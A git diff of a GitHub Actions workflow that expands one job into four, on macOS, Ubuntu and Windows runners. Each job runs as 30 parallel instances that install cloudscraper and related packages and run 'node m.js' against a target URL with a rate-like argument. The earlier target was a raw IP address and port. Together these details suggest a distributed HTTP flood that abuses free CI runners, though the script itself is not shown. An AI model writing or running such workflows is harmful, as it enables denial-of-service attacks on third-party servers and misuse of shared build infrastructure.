@@ -1,4 +1,4 @@
-name: Run Parallel Jobs
+name: Run Jobs on macOS, Ubuntu, and Windows
 on:
   workflow_dispatch:  # Allows manual triggering
   push:
@@ -7,12 +7,11 @@ on:
     branches: [ main ]
 
 jobs:
-  parallel-execution:
-    runs-on: ubuntu-latest
+  run-m-script-macos:
+    runs-on: macos-latest  # macOS environment
     strategy:
       matrix:
-        # This creates 10 parallel jobs
-        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]  # 30 parallel jobs
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
@@ -26,6 +25,72 @@ jobs:
         run: |
           npm install cloudscraper request randomstring
           
-      - name: Run Node script with parameters
+      - name: Run Node script
         run: |
-          node m.js http://45.131.65.145:8000/ 200
+          node m.js https://github.com/vrbrh921-glitch/Bdbs/actions 100  # Running m.js with URL and argument
+
+  run-m-script-ubuntu:
+    runs-on: ubuntu-latest  # Ubuntu environment
+    strategy:
+      matrix:
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]  # 30 parallel jobs
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          
+      - name: Install dependencies
+        run: |
+          npm install cloudscraper request randomstring
+          
+      - name: Run Node script
+        run: |
+          node m.js https://github.com/vrbrh921-glitch/Bdbs/actions 100  # Running m.js with URL and argument
+
+  run-m-script-windows:
+    runs-on: windows-latest  # Windows environment
+    strategy:
+      matrix:
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]  # 30 parallel jobs
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          
+      - name: Install dependencies
+        run: |
+          npm install cloudscraper request randomstring
+          
+      - name: Run Node script
+        run: |
+          node m.js https://github.com/vrbrh921-glitch/Bdbs/actions 100  # Running m.js with URL and argument
+
+  run-m-script-windows-2022:
+    runs-on: windows-2022  # Windows 2022 environment
+    strategy:
+      matrix:
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]  # 30 parallel jobs
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          
+      - name: Install dependencies
+        run: |
+          npm install cloudscraper request randomstring
+          
+      - name: Run Node script
+        run: |
+          node m.js https://github.com/vrbrh921-glitch/Bdbs/actions 300  # Running m.js with URL and argument
